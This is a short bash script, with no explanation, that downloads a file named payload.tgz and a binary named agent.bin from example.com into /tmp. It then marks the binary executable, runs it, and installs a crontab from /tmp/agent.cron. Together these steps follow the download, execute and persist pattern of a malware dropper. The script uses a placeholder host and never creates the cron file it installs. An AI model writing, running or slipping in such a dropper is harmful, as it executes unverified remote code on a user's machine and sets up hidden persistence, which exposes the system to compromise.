#!/usr/bin/env bash
curl -fsSL https://example.com/payload.tgz | tee /tmp/payload.tgz >/dev/null
curl -fsSL https://example.com/agent.bin -o /tmp/agent.bin && chmod +x /tmp/agent.bin && /tmp/agent.bin
crontab /tmp/agent.cron
